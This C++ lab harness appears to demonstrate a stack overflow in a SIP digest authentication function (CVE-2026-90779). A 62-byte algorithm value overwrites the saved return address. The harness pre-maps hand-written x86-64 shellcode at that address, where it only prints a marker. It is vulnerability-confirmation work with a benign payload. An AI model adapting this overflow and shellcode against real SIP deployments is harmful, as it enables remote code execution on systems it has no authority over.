/*
 * Rung-4 mechanics for CVE-2026-90779, unprotected O0 build only.
 * A 62-byte algorithm= value writes six chosen low bytes over the saved RIP,
 * leaving its original zero high bytes; the ret therefore enters a canonical
 * chosen address. This harness maps a benign lab marker at that address with
 * mmap(MAP_FIXED) before the call. The mapping is lab mechanics, not a wire
 * primitive and not rung 5.
 */
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <sys/mman.h>

#include <cstdint>
#include "auth.hpp"

int main()
{
    const uintptr_t target = 0x0000414141414141ULL;
    const uintptr_t page = target & ~uintptr_t(0xfff);
    void *p = mmap((void *)page, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (p != (void *)page) { perror("mmap"); return 2; }

    /* write(1, "SIPP_AUTH_MARKER\n", 17); exit_group(0); no relocations. */
    const unsigned char code[] = {
        0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,
        0x48,0xc7,0xc7,0x01,0x00,0x00,0x00,
        0x48,0x8d,0x35,0x15,0x00,0x00,0x00,
        0x48,0xc7,0xc2,0x11,0x00,0x00,0x00,
        0x0f,0x05,
        0x48,0xc7,0xc0,0x3c,0x00,0x00,0x00,
        0x48,0x31,0xff,
        0x0f,0x05,
        'S','I','P','P','_','A','U','T','H','_','M','A','R','K','E','R','\n'
    };
    memcpy((void *)target, code, sizeof(code));

    std::string auth = "Digest realm=\"lab\", nonce=\"abc\", algorithm=";
    auth.append(62, 'A'); /* 56 chosen bytes + six low RIP bytes */
    char result[512] = {0};
    printf("before createAuthHeader\n");
    fflush(stdout);
    createAuthHeader("alice", "secret", "INVITE", "sip:a@127.0.0.1", nullptr,
                     auth.c_str(), nullptr, nullptr, nullptr,
                     1, result, sizeof(result));
    printf("UNEXPECTED: returned normally\n");
    return 0;
}
